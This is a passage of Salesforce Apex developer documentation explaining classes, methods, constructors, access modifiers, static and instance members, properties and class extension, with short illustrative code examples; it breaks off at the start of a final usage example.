As in Java, you can create classes in Apex. A class is a template or blueprint from which objects are created. An object is an instance of a class. For example, the `PurchaseOrder` class describes an entire purchase order, and everything that you can do with a purchase order. An instance of the `PurchaseOrder` class is a specific purchase order that you send or receive. All objects have state and behavior , that is, things that an object knows about itself, and things that an object can do. The state of a PurchaseOrder object—what it knows—includes the user who sent it, the date and time it was created, and whether it was flagged as important. The behavior of a PurchaseOrder object—what it can do—includes checking inventory, shipping a product, or notifying a customer. A class can contain variables and methods. Variables are used to specify the state of an object, such as the object's `Name` or `Type` . Since these variables are associated with a class and are members of it, they are commonly referred to as member variables . Methods are used to control behavior, such as `getOtherQuotes` or `copyLineItems` . A class can contain other classes, exception types, and initialization code. An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body of each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained in the interface. For more general information on classes, objects, and interfaces, see http://java.sun.com/docs/books/tutorial/java/concepts/index.html In addition to classes, Apex provides triggers, similar to database triggers. A trigger is Apex code that executes before or after database operations. See Triggers . 1. Apex Class Definition 2. Class Variables 3. Class Methods Learn how to define Apex methods. Understand the differences between passing method arguments by value and passing method arguments by reference. 4. Using Constructors 5. Access Modifiers 6. Static and Instance Methods, Variables, and Initialization Code In Apex, you can have static methods, variables, and initialization code. However, Apex classes can't be static. You can also have instance methods, member variables, and initialization code, which have no modifiers, and local variables. 7. Apex Properties 8. Extending a Class You can extend a class to provide more specialized behavior. 9. Extended Class Example

#### Apex Class Definition

In Apex, you can define top-level classes (also called outer classes) as well as inner classes, that is, a class defined within another class. You can only have inner classes one level deep. For example:

```apex
public class myOuterClass {
```

```apex
// Additional myOuterClass code here
class myInnerClass {
```

```apex
// myInnerClass code here
}
}
```

To define a class, specify the following: **1.** Access modifiers: You must use one of the access modifiers (such as `public` or `global` ) in the declaration of a top-level class. You don’t have to use an access modifier in the declaration of an inner class. **2.** Optional definition modifiers (such as `virtual` , `abstract` , and so on) **3.** Required: The keyword `class` followed by the name of the class **4.** Optional extensions or implementations or both Avoid using standard object names for class names. Doing so causes unexpected results. For a list of standard objects, see Object Reference for Salesforce . Use the following syntax for defining classes:

```apex
private | public | global
[virtual | abstract | with sharing | without sharing]
class ClassName [implements InterfaceNameList] [extends ClassName]
{
// The body of the class
}
```

The `private` access modifier declares that this class is only known locally, that is, only by this section of code. This is the default access for inner classes—that is, if you don't specify an access modifier for an inner class, it’s considered `private` . This keyword can only be used with inner classes (or with top-level test classes marked with the `@IsTest` annotation). The `public` access modifier declares that this class is visible in your application or namespace. The `global` access modifier declares that this class is known by all Apex code everywhere. All classes containing methods defined with the `webservice` keyword must be declared as `global` . If a method or inner class is declared as `global` , the outer, top-level class must also be defined as `global` . The `with` `sharing` and `without` `sharing` keywords specify the sharing mode for this class. For more information, see Use the with sharing, without sharing, and inherited sharing Keywords on page 90. The `virtual` definition modifier declares that this class allows extension and overrides. You can’t override a method with the `override` keyword unless the class has been defined as `virtual` . The `abstract` definition modifier declares that this class contains abstract methods, that is, methods that only have their signature declared and no body defined. You can’t add an abstract method to a global class after the class has been uploaded in a Managed - Released package version. If the class in the Managed - Released package is virtual, the method that you can add to it must also be virtual and must have an implementation. You can’t override a public or protected virtual method of a global class of an installed managed package. For more information about managed packages, see Managed Package Types on page 765. A class can implement multiple interfaces, but only extend one existing class. This restriction means that Apex doesn’t support multiple inheritance. The interface names in the list are separated by commas. For more information about interfaces, see Interfaces on page 82. For more information about method and variable access modifiers, see Access Modifiers on page 69. In API version 65.0 and later, an abstract or override method requires a `protected` , `public` , or `global` access modifier. If one of these access modifiers isn’t explicitly included in the method declaration, then method access defaults to `private` . Private access is invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare an abstract or override method without an allowed access modifier, you get the compilation error `Abstract` `methods` `require` `at` `least` `one` `of` `the` `following:` `global` `,` `public` `,` `protected` . In API version 61.0 and later, private methods are no longer overridden by an instance method with the same signature in a subclass. This change is versioned, so to prevent the override, update your abstract or virtual classes that contain private methods to API version 61.0 or later. In API version 60.0 and earlier, if a subclass declares an instance method with the same signature as a private method in one of its superclasses, the subclass method overrides the private method. Documentation Typographical Conventions Salesforce Help : Manage Apex Classes Salesforce Help : Developer Console Functionality

#### Class Variables

To declare a variable, specify the following: Optional: Modifiers, such as `public` or `final` , as well as `static` . Required: The data type of the variable, such as String or Boolean. Required: The name of the variable. Optional: The value of the variable. Use the following syntax when defining a variable:

```apex
[public | private | protected | global] [final] [static] data_type variable_name
[= value]
```

For example:

```apex
private static final Integer MY_INT;
private final Integer i = 1;
```

In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages .

#### Class Methods

Learn how to define Apex methods. Understand the differences between passing method arguments by value and passing method arguments by reference. Apex methods are comprised of these elements. Optional: Modifiers, such as `public` or `protected` . Required: The data type of the value returned by the method, such as String or Integer. Use `void` if the method doesn’t return a value. Required: A list of input parameters for the method, separated by commas, each preceded by its data type, and enclosed in parentheses `()` . If there are no parameters, use a set of empty parentheses. A method can only have 32 input parameters. Required: The body of the method, enclosed in braces `{}` . All the code for the method, including any local variable declarations, is contained here. All Apex types implement the Object class methods. To define a method, use this syntax.

```apex
[public | private | protected | global] [override] [static] data_type method_name (input
parameters) {
```

```apex
// The body of the method
}
```

You can use `override` to override methods only in classes that have been defined as `virtual` or `abstract` . This method has the correct syntax.:

```apex
public static Integer getInt() {
```

```apex
return MY_INT;
}
```

As in Java, methods that return values can also be run as a statement if their results aren’t assigned to another variable. User-defined methods: Can be used anywhere that system methods are used. Can be recursive. Can have side effects, such as DML `insert` statements that initialize sObject record IDs. See Apex DML Statements . Can refer to themselves or to methods defined later in the same class or anonymous block. Apex parses methods in two phases, so forward declarations aren’t needed. Can be overloaded. For example, a method named `example` can be implemented in two ways, one with a single Integer parameter and one with two Integer parameters. Depending on whether the method is called with one or two Integers, the Apex parser selects the appropriate implementation to execute. If the parser can’t find an exact match, it then seeks an approximate match using type coercion rules. For more information on data conversion, see Rules of Conversion on page 52. If the parser finds multiple approximate matches, a parse-time exception is generated. Methods with a void return type are typically invoked as a standalone statement in Apex code. For example:

```apex
System.debug('Here is a note for the log.');
```

Can have statements where the return values are run as a statement if their results aren’t assigned to another variable. This rule is the same in Java. All user-defined types support the `clone` method. The `clone()` method in Apex is based on the clone method in Java . In Apex, primitive data type arguments, such as Integer or String, are passed into methods by value. This fact means that any changes to the arguments exist only within the scope of the method. When the method returns, the changes to the arguments are lost. Non-primitive data type arguments, such as sObjects, are passed into methods by reference. Therefore, when the method returns, the passed-in argument still references the same object as before the method call. Within the method, the reference can't be changed to point to another object but the values of the object's fields can be changed. These examples demonstrate the differences between passing primitive and non-primitive data type arguments into methods. **Example: Passing Primitive Data Type Arguments** This example shows how a primitive argument of type String is passed by value into another method. The `debugStatusMessage` method in this example creates a String variable, `msg` , and assigns it a value. It then passes this variable as an argument to another method, which modifies the value of this String. However, because String is a primitive type, it’s passed by value, and when the method returns, the value of the original variable, `msg` , is unchanged. An assert statement verifies that the value of `msg` is still the old value.

```apex
public class PassPrimitiveTypeExample {
```

```apex
public static void debugStatusMessage() {
```

```apex
String msg = 'Original value';
processString(msg);
// The value of the msg variable didn't
// change; it is still the old value.
System.assertEquals(msg, 'Original value');
}
```

```apex
public static void processString(String s) {
s = 'Modified value';
}
}
```

**Example: Passing Non-Primitive Data Type Arguments** This example shows how a List argument is passed by reference into the `reference()` method and is modified. It then shows, in the `referenceNew()` method, that the List argument can't be changed to point to another List object. First, the `createTemperatureHistory` method creates a variable, `fillMe` , that is a List of Integers and passes it to a method. The called method fills this list with Integer values representing rounded temperature values. When the method returns, an assert statement verifies that the contents of the original List variable has changed and now contains five values. Next, the example creates a second List variable, `createMe` , and passes it to another method. The called method assigns the passed-in argument to a newly created List that contains new Integer values. When the method returns, the original `createMe` variable doesn't point to the new List but still points to the original List, which is empty. An assert statement verifies that `createMe` contains no values.

```apex
public class PassNonPrimitiveTypeExample {
```

```apex
public static void createTemperatureHistory() {
List<Integer> fillMe = new List<Integer>();
reference(fillMe);
// The list is modified and contains five items
// as expected.
System.assertEquals(fillMe.size(),5);
```

```apex
List<Integer> createMe = new List<Integer>();
referenceNew(createMe);
// The list is not modified because it still points
// to the original list, not the new list
// that the method created.
System.assertEquals(createMe.size(),0);
}
```

```apex
public static void reference(List<Integer> m) {
```

```apex
// Add rounded temperatures for the last five days.
m.add(70);
m.add(68);
m.add(75);
m.add(80);
m.add(82);
}
```

```apex
public static void referenceNew(List<Integer> m) {
```

```apex
// Assign argument to a new List of
// five temperature values.
m = new List<Integer>{55, 59, 62, 60, 63};
}
}
```

In API version 65.0 and later, an abstract or override method requires a `protected` , `public` , or `global` access modifier. If one of these access modifiers isn’t explicitly included in the method declaration, then method access defaults to `private` . Private access is invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare an abstract or override method without an allowed access modifier, you get the compilation error `Abstract` `methods` `require` `at` `least` `one` `of` `the` `following:` `global` `,` `public` `,` `protected` . In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages . Primitive Data Types

#### Using Constructors

A constructor is code that is invoked when an object is created from the class blueprint. You do not need to write a constructor for every class. If a class doesn't have a user-defined constructor, a default, no-argument constructor with the same visibility as the containing class is generated. The syntax for a constructor is similar to a method, but it differs from a method definition in that it never has an explicit return type and it is not inherited by the object created from it. After you write the constructor for a class, you must use the `new` keyword in order to instantiate an object from that class, using that constructor. For example, using the following class:

```apex
public class TestObject {
```

```apex
// The no argument constructor
public TestObject() {
```

```apex
// more code here
}
}
```

A new object of this type can be instantiated with this code.

```apex
TestObject myTest = new TestObject();
```

If you write a constructor that takes arguments, you can then use that constructor to create an object using those arguments. If you create a constructor that takes arguments, and you still want to use a no-argument constructor, you must create your own no-argument constructor in your code. After you create a constructor for a class, you no longer have access to the default, no-argument public constructor. In Apex, a constructor can be overloaded , that is, there can be more than one constructor for a class, each having different parameters. This example illustrates a class with two constructors: one with no arguments and one that takes a simple Integer argument. It also illustrates how one constructor calls another constructor using the `this` `(...)` syntax, also know as constructor chaining .

```apex
public class TestObject2 {
```

```apex
private static final Integer DEFAULT_SIZE = 10;
```

```apex
Integer size;
```

```apex
//Constructor with no arguments
public TestObject2() {
```

```apex
this(DEFAULT_SIZE); // Using this(...) calls the one argument constructor
}
```

```apex
// Constructor with one argument
public TestObject2(Integer ObjectSize) {
size = ObjectSize;
```

```apex
}
}
```

New objects of this type can be instantiated with this code.

```apex
TestObject2 myObject1 = new TestObject2(42);
TestObject2 myObject2 = new TestObject2();
```

Every constructor that you create for a class must have a different argument list. In this example, all of the constructors are possible.

```apex
public class Leads {
```

```apex
// First a no-argument constructor
public Leads () {}
```

```apex
// A constructor with one argument
public Leads (Boolean call) {}
```

```apex
// A constructor with two arguments
public Leads (String email, Boolean call) {}
```

```apex
// Though this constructor has the same arguments as the
// one above, they are in a different order, so this is legal
public Leads (Boolean call, String email) {}
}
```

When you define a new class, you are defining a new data type. You can use class name in any place you can use other data type names, such as String, Boolean, or Account. If you define a variable whose type is a class, any object you assign to it must be an instance of that class or subclass.

#### Access Modifiers

Apex allows you to use the `private` , `protected` , `public` , and `global` access modifiers when defining methods and variables. While triggers and anonymous blocks can also use these access modifiers, they aren’t as useful in smaller portions of Apex. For example, declaring a method as `global` in an anonymous block doesn’t enable you to call it from outside of that code. For more information on class access modifiers, see Apex Class Definition on page 63. Methods defined in an interface have the same access modifier as the interface ( `public` or `global` ). For more information, see Interfaces . By default, a method or variable is visible only to the Apex code within the defining class . Explicitly specify a method or variable as public in order for it to be available to other classes in the same application namespace (see Namespace Prefix ). You can change the level of visibility by using the following access modifiers:

```apex
private
```

This access modifier is the default, and means that the method or variable is accessible only within the Apex class in which it’s defined. If you don’t specify an access modifier, the method or variable is `private` .

```apex
protected
```

This means that the method or variable is visible to any inner classes in the defining Apex class, and to the classes that extend the defining Apex class. You can only use this access modifier for instance methods and member variables. This setting is strictly more permissive than the default (private) setting, just like Java.

```apex
public
```

This means that the method or variable is accessible by all Apex within a specific package. For accessibility by all second-generation (2GP) managed packages that share a namespace, use `public` with the `@NamespaceAccessible` annotation. Using the public access modifier in no-namespace packages implicitly renders the Apex code as @NamespaceAccessible. In Apex, the `public` access modifier isn’t the same as it is in Java. This was done to discourage joining applications, to keep the code for each application separate. In Apex, if you want to make something public like it is in Java, you must use the `global` access modifier. For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages .

```apex
global
```

This means the method or variable can be used by any Apex code that has access to the class, not just the Apex code in the same application. This access modifier must be used for any method that must be referenced outside of the application, either in SOAP API or by other Apex code. If you declare a method or variable as `global` , you must also declare the class that contains it as `global` . We recommend using the `global` access modifier rarely, if at all. Cross-application dependencies are difficult to maintain. To use the `private` , `protected` , `public` , or `global` access modifiers, use the following syntax:

```apex
[(none)|private|protected|public|global] declaration
```

For example:

```apex
// private variable s1
private string s1 = '1';
```

```apex
// public method getsz()
public string getsz() {
...
}
```

In API version 65.0 and later, an abstract or override method requires a `protected` , `public` , or `global` access modifier. If one of these access modifiers isn’t explicitly included in the method declaration, then method access defaults to `private` . Private access is invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare an abstract or override method without an allowed access modifier, you get the compilation error `Abstract` `methods` `require` `at` `least` `one` `of` `the` `following:` `global` `,` `public` `,` `protected` .

#### Static and Instance Methods, Variables, and Initialization Code

In Apex, you can have static methods, variables, and initialization code. However, Apex classes can't be static. You can also have instance methods, member variables, and initialization code, which have no modifiers, and local variables. Static methods, variables, and initialization code have these characteristics. They’re associated with a class. They’re allowed only in outer classes. They’re initialized only when a class is loaded. They aren’t transmitted as part of the view state for a Visualforce page. Instance methods, member variables, and initialization code have these characteristics. They’re associated with a particular object. They have no definition modifier. They’re created with every object instantiated from the class in which they’re declared. Local variables have these characteristics. They’re associated with the block of code in which they’re declared. They must be initialized before they’re used. The following example shows a local variable whose scope is the duration of the `if` code block.

```apex
Boolean myCondition = true;
if (myCondition) {
integer localVariable = 10;
}
```

You can use static methods and variables only with outer classes. Inner classes have no static methods or variables. A static method or variable doesn’t require an instance of the class in order to run. Before an object of a class is created, all static member variables in a class are initialized, and all static initialization code blocks are executed. These items are handled in the order in which they appear in the class. A static method is used as a utility method, and it never depends on the value of an instance member variable. Because a static method is only associated with a class, it can’t access the instance member variable values of its class. A static variable is static only within the scope of the Apex transaction. It’s not static across the server or the entire organization. The value of a static variable persists within the context of a single transaction and is reset across transaction boundaries. For example, if an Apex DML request causes a trigger to fire multiple times, the static variables persist across these trigger invocations. To store information that is shared across instances of a class, use a static variable. All instances of the same class share a single copy of the static variable. For example, all triggers that a single transaction spawns can communicate with each other by viewing and updating static variables in a related class. A recursive trigger can use the value of a class variable to determine when to exit the recursion. Suppose that you had the following class.

```apex
public class P {
```

```apex
public static boolean firstRun = true;
}
```

A trigger that uses this class could then selectively fail the first run of the trigger.

```apex
trigger T1 on Account (before delete, after delete, after undelete) {
```

```apex
if(Trigger.isBefore){
```

```apex
if(Trigger.isDelete){
```

```apex
if(p.firstRun){
Trigger.old[0].addError('Before Account Delete Error');
p.firstRun=false;
}
}
}
}
```

A static variable defined in a trigger doesn't retain its value between different trigger contexts within the same transaction, such as between before insert and after insert invocations. Instead, define the static variables in a class so that the trigger can access these class member variables and check their static values. A class static variable can’t be accessed through an instance of that class. If class `MyClass` has a static variable `myStaticVariable` , and `myClassInstance` is an instance of `MyClass` , `myClassInstance.myStaticVariable` isn’t a legal expression. The same is true for instance methods. If `myStaticMethod()` is a static method, `myClassInstance.myStaticMethod()` isn’t legal. Instead, refer to those static identifiers using the class: `MyClass.myStaticVariable` and `MyClass.myStaticMethod()` . Local variable names are evaluated before class names. If a local variable has the same name as a class, the local variable hides methods and variables on the class of the same name. For example, this method works if you comment out the `String` line. But if the `String` line is included the method doesn’t compile, because Salesforce reports that the method doesn’t exist or has an incorrect signature.

```apex
public static void method() {
String Database = '';
Database.insert(new Account());
}
```

An inner class behaves like a static Java inner class, but doesn’t require the `static` keyword. An inner class can have instance member variables like an outer class, but there’s no implicit pointer to an instance of the outer class (using the `this` keyword). In API version 20.0 and earlier, if a Bulk API request causes a trigger to fire, each chunk of 200 records for the trigger to process is split into chunks of 100 records. In Salesforce API version 21.0 and later, no further splits of API chunks occur. If a Bulk API request causes a trigger to fire multiple times for chunks of 200 records, governor limits are reset between these trigger invocations for the same HTTP request. Static variables aren’t reset within the multiple trigger invocations for the same Bulk API request. Instance methods and member variables are used by an instance of a class, that is, by an object. An instance member variable is declared inside a class, but not within a method. Instance methods usually use instance member variables to affect the behavior of the method. Suppose that you want to have a class that collects two-dimensional points and plots them on a graph. The following skeleton class uses member variables to hold the list of points and an inner class to manage the two-dimensional list of points.

```apex
public class Plotter {
```

```apex
// This inner class manages the points
class Point {
```

```apex
Double x;
Double y;
```

```apex
Point(Double x, Double y) {
```

```apex
this.x = x;
this.y = y;
}
Double getXCoordinate() {
```

```apex
return x;
}
```

```apex
Double getYCoordinate() {
```

```apex
return y;
}
}
```

```apex
List<Point> points = new List<Point>();
```

```apex
public void plot(Double x, Double y) {
points.add(new Point(x, y));
}
```

```apex
// The following method takes the list of points and does something with them
public void render() {
}
}
```

Instance initialization code is a block of code in the following form that is defined in a class.

```apex
{
```

```apex
//code body
```

```apex
}
```

The instance initialization code in a class is executed each time an object is instantiated from that class. These code blocks run before the constructor. If you don’t want to write your own constructor for a class, you can use an instance initialization code block to initialize instance variables. In simple situations, use an ordinary initializer. Reserve initialization code for complex situations, such as initializing a static map. A static initialization block runs only one time, regardless of how many times you access the class that contains it. Static initialization code is a block of code preceded with the keyword `static` .

```apex
static {
```

```apex
//code body
```

```apex
}
```

Similar to other static code, a static initialization code block is only initialized one time on the first use of the class. A class can have any number of either static or instance initialization code blocks. They can appear anywhere in the code body. The code blocks are executed in the order in which they appear in the file, just as they are in Java. You can use static initialization code to initialize static final variables and to declare information that’s static, such as a map of values. For example:

```apex
public class MyClass {
```

```apex
class RGB {
```

```apex
Integer red;
Integer green;
Integer blue;
```

```apex
RGB(Integer red, Integer green, Integer blue) {
```

```apex
this.red = red;
this.green = green;
this.blue = blue;
```

```apex
}
}
```

```apex
static Map<String, RGB> colorMap = new Map<String, RGB>();
```

```apex
static {
colorMap.put('red', new RGB(255, 0, 0));
colorMap.put('cyan', new RGB(0, 255, 255));
colorMap.put('magenta', new RGB(255, 0, 255));
}
}
```

In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages .

#### Apex Properties

An Apex property is similar to a variable; however, you can do additional things in your code to a property value before it’s accessed or returned. Properties can be used to validate data before a change is made, to prompt an action when data is changed (such as altering the value of other member variables), or to expose data that is retrieved from some other source (such as another class). Property definitions include one or two code blocks, representing a get accessor and a set accessor : The code in a get accessor executes when the property is read. The code in a set accessor executes when the property is assigned a new value. If a property has only a get accessor, it’s considered read-only. If a property has only a set accessor, it’s considered write-only. A property with both accessors is considered read-write. To declare a property, use the following syntax in the body of a class:

```apex
Public class BasicClass {
```

```apex
// Property declaration
access_modifier return_type property_name {
get {
```

```apex
//Get accessor code block
}
set {
```

```apex
//Set accessor code block
}
}
}
```

Where: `access_modifier` is the access modifier for the property. The access modifiers that can be applied to properties include: `public` , `private` , `global` , and `protected` . In addition, these definition modifiers can be applied: `static` and `transient` . For more information on access modifiers, see Access Modifiers on page 69. `return_type` is the type of the property, such as Integer, Double, sObject, and so on. For more information, see Data Types on page 24. `property_name` is the name of the property For example, the following class defines a property named `prop` . The property is public. The property returns an integer data type.

```apex
public class BasicProperty {
```

```apex
public integer prop {
get { return prop; }
set { prop = value; }
}
}
```

The following code segment calls the BasicProperty class, exercising the get and set accessors:

```apex
BasicProperty bp = new BasicProperty();
bp.prop = 5;
// Calls set accessor
System.assertEquals(5, bp.prop);
// Calls get accessor
```

Note the following: The body of the get accessor is similar to that of a method. It must return a value of the property type. Executing the get accessor is the same as reading the value of the variable. The get accessor must end in a return statement. We recommend that your get accessor not change the state of the object that it’s defined on. The set accessor is similar to a method whose return type is void. When you assign a value to the property, the set accessor is invoked with an argument that provides the new value. In API version 42.0 and later, unless a variable value is set in a set accessor, you can’t update its value in a get accessor. When the set accessor is invoked, the system passes an implicit argument to the setter called `value` of the same data type as the property. Properties can’t be defined on `interface` . Apex properties are based on their counterparts in C#, with the following differences: Properties provide storage for values directly. You don’t need to create supporting members for storing values. It’s possible to create automatic properties in Apex. For more information, see Using Automatic Properties on page 75. Properties don’t require additional code in their get or set accessor code blocks. Instead, you can leave get and set accessor code blocks empty to define an automatic property . Automatic properties allow you to write more compact code that is easier to debug and maintain. They can be declared as read-only, read-write, or write-only. The following example creates three automatic properties:

```apex
public class AutomaticProperty {
```

```apex
public integer MyReadOnlyProp { get; }
public double MyReadWriteProp { get; set; }
public string MyWriteOnlyProp { set; }
}
```

The following code segment exercises these properties:

```apex
AutomaticProperty ap = new AutomaticProperty();
ap.MyReadOnlyProp = 5;
// This produces a compile error: not writable
ap.MyReadWriteProp = 5;
// No error
System.assertEquals(5, ap.MyWriteOnlyProp);
// This produces a compile error: not readable
```

When a property is declared as `static` , the property's accessor methods execute in a static context. Therefore, accessors don’t have access to non-static member variables defined in the class. The following example creates a class with both static and instance properties:

```apex
public class StaticProperty {
```

```apex
private static integer StaticMember;
private integer NonStaticMember;
```

```apex
// The following produces a system error
// public static integer MyBadStaticProp { return NonStaticMember; }
```

```apex
public static integer MyGoodStaticProp {
get {return StaticMember;}
set { StaticMember = value; }
}
public integer MyGoodNonStaticProp {
get {return NonStaticMember;}
set { NonStaticMember = value; }
}
}
```

The following code segment calls the static and instance properties:

```apex
StaticProperty sp = new StaticProperty();
// The following produces a system error: a static variable cannot be
// accessed through an object instance
// sp.MyGoodStaticProp = 5;
```

```apex
// The following does not produce an error
StaticProperty.MyGoodStaticProp = 5;
```

Property accessors can be defined with their own access modifiers. If an accessor includes its own access modifier, this modifier overrides the access modifier of the property. The access modifier of an individual accessor must be more restrictive than the access modifier on the property itself. For example, if the property has been defined as `public` , the individual accessor can’t be defined as `global` . The following class definition shows additional examples:

```apex
global virtual class PropertyVisibility {
```

```apex
// X is private for read and public for write
public integer X { private get; set; }
// Y can be globally read but only written within a class
global integer Y { get; public set; }
// Z can be read within the class but only subclasses can set it
public integer Z { get; protected set; }
}
```

#### Extending a Class

You can extend a class to provide more specialized behavior. A class that extends another class inherits all the methods and properties of the extended class. In addition, the extending class can override the existing virtual methods by using the override keyword in the method definition. Overriding a virtual method allows you to provide a different implementation for an existing method. This means that the behavior of a particular method is different based on the object you’re calling it on. This is referred to as polymorphism. A class extends another class using the `extends` keyword in the class definition. A class can only extend one other class, but it can implement more than one interface. This example shows how the `YellowMarker` class extends the `Marker` class. To run the inheritance examples in this section, first create the `Marker` class.

```apex
public virtual class Marker {
```

```apex
public virtual void write() {
System.debug('Writing some text.');
}
```

```apex
public virtual Double discount() {
```

```apex
return .05;
}
}
```

Then create the `YellowMarker` class, which extends the `Marker` class.

```apex
// Extension for the Marker class
public class YellowMarker extends Marker {
```

```apex
public override void write() {
System.debug('Writing some text using the yellow marker.');
}
}
```

This code segment shows polymorphism. The example declares two objects of the same type ( `Marker` ). Even though both objects are markers, the second object is assigned to an instance of the `YellowMarker` class. Hence, calling the `write` method on it yields a different result than calling this method on the first object, because this method has been overridden. However, you can call the `discount` method on the second object even though this method isn't part of the `YellowMarker` class definition. But it’s part of the extended class, and hence, is available to the extending class, `YellowMarker` . Run this snippet in the Execute Anonymous window of the Developer Console.

```apex
Marker obj1, obj2;
obj1 = new Marker();
// This outputs 'Writing some text.'
obj1.write();
```

```apex
obj2 = new YellowMarker();
// This outputs 'Writing some text using the yellow marker.'
obj2.write();
// We get the discount method for free
// and can call it from the YellowMarker instance.
Double d = obj2.discount();
```

The extending class can have more method definitions that aren't common with the original extended class. In this example, the `RedMarker` class extends the `Marker` class and has one extra method, `computePrice` , that isn't available for the `Marker` class. To call the extra methods, the object type must be the extending class. Before running the next snippet, create the `RedMarker` class, which requires the `Marker` class in your org.

```apex
// Extension for the Marker class
public class RedMarker extends Marker {
```

```apex
public override void write() {
System.debug('Writing some text in red.');
```

```apex
}
```

```apex
// Method only in this class
public Double computePrice() {
```

```apex
return 1.5;
}
}
```

This snippet shows how to call the additional method on the `RedMarker` class. Run this snippet in the Execute Anonymous window of the Developer Console.

```apex
RedMarker obj = new RedMarker();
// Call method specific to RedMarker only
Double price = obj.computePrice();
```

Extensions also apply to interfaces—an interface can extend another interface. As with classes, when an interface extends another interface, all the methods and properties of the extended interface are available to the extending interface. In API version 65.0 and later, an abstract or override method requires a `protected` , `public` , or `global` access modifier. If one of these access modifiers isn’t explicitly included in the method declaration, then method access defaults to `private` . Private access is invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare an abstract or override method without an allowed access modifier, you get the compilation error `Abstract` `methods` `require` `at` `least` `one` `of` `the` `following:` `global` `,` `public` `,` `protected` . In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages .

#### Extended Class Example

The following is an extended example of a class, showing all the features of Apex classes. The keywords and concepts introduced in the example are explained in more detail throughout this chapter.

```apex
// Top-level (outer) class must be public or global (usually public unless they contain
// a Web Service, then they must be global)
public class OuterClass {
```

```apex
// Static final variable (constant) – outer class level only
private static final Integer MY_INT;
```

```apex
// Non-final static variable - use this to communicate state across triggers
// within a single request)
public static String sharedState;
```

```apex
// Static method - outer class level only
public static Integer getInt() { return MY_INT; }
```

```apex
// Static initialization (can be included where the variable is defined)
static {
MY_INT = 2;
}
```

```apex
// Member variable for outer class
private final String m;
```

```apex
// Instance initialization block - can be done where the variable is declared,
// or in a constructor
{
m = 'a';
}
```

```apex
// Because no constructor is explicitly defined in this outer class, an implicit,
// no-argument, public constructor exists
```

```apex
// Inner interface
public virtual interface MyInterface {
```

```apex
// No access modifier is necessary for interface methods - these are always
// public or global depending on the interface visibility
void myMethod();
}
```

```apex
// Interface extension
interface MySecondInterface extends MyInterface {
```

```apex
Integer method2(Integer i);
}
```

```apex
// Inner class - because it is virtual it can be extended.
// This class implements an interface that, in turn, extends another interface.
// Consequently the class must implement all methods.
public virtual class InnerClass implements MySecondInterface {
```

```apex
// Inner member variables
private final String s;
private final String s2;
```

```apex
// Inner instance initialization block (this code could be located above)
{
```

```apex
this.s = 'x';
}
```

```apex
// Inline initialization (happens after the block above executes)
private final Integer i = s.length();
```

```apex
// Explicit no argument constructor
InnerClass() {
```

```apex
// This invokes another constructor that is defined later
this('none');
}
```

```apex
// Constructor that assigns a final variable value
public InnerClass(String s2) {
```

```apex
this.s2 = s2;
}
```

```apex
// Instance method that implements a method from MyInterface.
```

```apex
// Because it is declared virtual it can be overridden by a subclass.
public virtual void myMethod() { /* does nothing */ }
```

```apex
// Implementation of the second interface method above.
// This method references member variables (with and without the "this" prefix)
public Integer method2(Integer i) { return this.i + s.length(); }
}
```

```apex
// Abstract class (that subclasses the class above). No constructor is needed since
// parent class has a no-argument constructor
public abstract class AbstractChildClass extends InnerClass {
```

```apex
// Override the parent class method with this signature.
// Must use the override keyword
public override void myMethod() { /* do something else */ }
```

```apex
// Same name as parent class method, but different signature.
// This is a different method (displaying polymorphism) so it does not need
// to use the override keyword
protected void method2() {}
```

```apex
// Abstract method - subclasses of this class must implement this method
public abstract Integer abstractMethod();
}
```

```apex
// Complete the abstract class by implementing its abstract method
public class ConcreteChildClass extends AbstractChildClass {
```

```apex
// Here we expand the visibility of the parent method - note that visibility
// cannot be restricted by a sub-class
public override Integer abstractMethod() { return 5; }
}
```

```apex
// A second sub-class of the original InnerClass
public class AnotherChildClass extends InnerClass {
AnotherChildClass(String s) {
```

```apex
// Explicitly invoke a different super constructor than one with no arguments
super(s);
}
}
```

```apex
// Exception inner class
public virtual class MyException extends Exception {
```

```apex
// Exception class member variable
public Double d;
```

```apex
// Exception class constructor
MyException(Double d) {
```

```apex
this.d = d;
}
```

```apex
// Exception class method, marked as protected
protected void doIt() {}
}
```

```apex
// Exception classes can be abstract and implement interfaces
public abstract class MySecondException extends Exception implements MyInterface {
}
}
```

This code example illustrates: A top-level class definition (also called an outer class ) Static variables and static methods in the top-level class, as well as static initialization code blocks Member variables and methods for the top-level class Classes with no user-defined constructor — these have an implicit, no-argument constructor An interface definition in the top-level class An interface that extends another interface Inner class definitions (one level deep) within a top-level class A class that implements an interface (and, therefore, its associated sub-interface) by implementing public versions of the method signatures An inner class constructor definition and invocation An inner class member variable and a reference to it using the `this` keyword (with no arguments) An inner class constructor that uses the `this` keyword (with arguments) to invoke a different constructor Initialization code outside of constructors — both where variables are defined, as well as with anonymous blocks in curly braces ( `{}` ). Note that these execute with every construction in the order they appear in the file, as with Java. Class extension and an abstract class Methods that override base class methods (which must be declared `virtual` ) The `override` keyword for methods that override subclass methods Abstract methods and their implementation by concrete sub-classes The `protected` access modifier Exceptions as first class objects with members, methods, and constructors This example shows how the class above can be called by other Apex code:

```apex
// Construct an instance of an inner concrete class, with a user-defined constructor
